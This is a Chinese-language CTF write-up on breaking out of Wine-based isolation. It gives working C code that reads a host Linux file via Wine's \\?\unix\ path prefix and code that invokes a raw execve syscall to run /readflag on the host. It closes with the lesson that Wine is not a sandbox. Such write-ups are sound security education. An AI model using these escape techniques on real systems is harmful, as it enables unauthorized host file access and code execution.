# 杯窗鹅影

## 题目简述

远程环境允许上传并运行 Windows PE 程序，表面上通过 Wine 与 Linux 主机隔离。第一问要求读取宿主路径中的普通文件，第二问要求执行只能在 Linux 侧使用的 `/readflag`。核心问题是 Wine 兼容层并不是安全沙箱。

## 解题过程

### 读取 flag1

Wine 会把 Unix 文件系统暴露给 Windows 路径解析层。即使题目删除了常见的 `Z:` 盘映射，Wine 仍支持 `\\?\unix\...` 形式的 Unix 绝对路径。编译一个 Windows 控制台程序直接读取 `/flag1`：

```c
#include <stdio.h>

int main(void) {
    FILE *fp = fopen("\\\\?\\unix\\flag1", "rb");
    if (!fp) {
        perror("fopen");
        return 1;
    }

    int ch;
    while ((ch = fgetc(fp)) != EOF) {
        putchar(ch);
    }
    fclose(fp);
    return 0;
}
```

使用 MinGW-w64 生成题目接受的 PE 文件：

```bash
x86_64-w64-mingw32-gcc read_flag1.c -O2 -o read_flag1.exe
```

上传运行后即可得到第一段 flag。

### 执行 Linux 的 `/readflag`

Wine 负责实现 Windows API，但同架构 PE 中的普通机器指令仍由宿主 CPU 原生执行。题目环境是 x86-64 Linux，因此程序还可以绕过 Wine API，直接发起 Linux 系统调用。

x86-64 Linux 中 `execve` 的系统调用号为 `59`。将 `/readflag`、参数数组和空环境指针放入规定寄存器，然后执行 `syscall`：

```c
int main(void) {
    char path[] = "/readflag";
    char *argv[] = {path, 0};

    __asm__ volatile (
        "mov $59, %%rax\n"
        "mov %0, %%rdi\n"
        "mov %1, %%rsi\n"
        "xor %%rdx, %%rdx\n"
        "syscall\n"
        :
        : "r"(path), "r"(argv)
        : "rax", "rdi", "rsi", "rdx", "rcx", "r11", "memory"
    );
    return 1;
}
```

仍用 `x86_64-w64-mingw32-gcc` 编译并上传。`syscall` 进入的是宿主 Linux 内核，进程镜像会被 `/readflag` 替换，其标准输出返回第二段 flag。

这里不能把 Wine 理解成虚拟机：它没有创建新的内核安全边界，也不会自动阻止程序访问 Unix 路径或执行宿主系统调用。

## 方法总结

兼容层、容器和沙箱是不同概念。判断执行环境是否安全时，应确认实际的内核边界、文件系统边界和系统调用过滤，而不能只看程序使用哪套 API。Wine 只转换 Windows API；在没有 seccomp、独立用户或文件系统隔离等措施时，恶意 PE 仍能触达宿主资源。
